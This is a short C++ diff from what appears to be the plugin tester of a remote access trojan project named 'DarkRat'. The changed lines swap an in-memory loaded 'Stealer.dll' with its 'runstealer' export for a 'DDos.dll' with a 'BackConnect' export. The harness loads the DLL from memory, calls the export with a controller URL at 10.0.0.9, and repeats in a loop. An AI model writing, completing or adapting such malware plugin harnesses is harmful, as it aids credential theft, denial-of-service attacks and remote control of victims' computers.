@@ -48,14 +48,14 @@ int main()
     folder = "Release";
 #endif
 
-	std::string dir = "C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\" + folder + "\\Stealer.dll";
+	std::string dir = "C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\" + folder + "\\DDos.dll";
 
 	while (1) {
 		do
 		{
 			//std::cout << dir;
 			hLibrary = lib.LoadFromFile(dir.c_str()); // loaded the dll from byte array.
-			func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "runstealer");
+			func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "BackConnect");
 			fn("http://10.0.0.9/ddoscontroll");
 			lib.FreeLibraryFromMemory(hLibrary);
 			std::cout << '\n' << "Press a key to continue...";
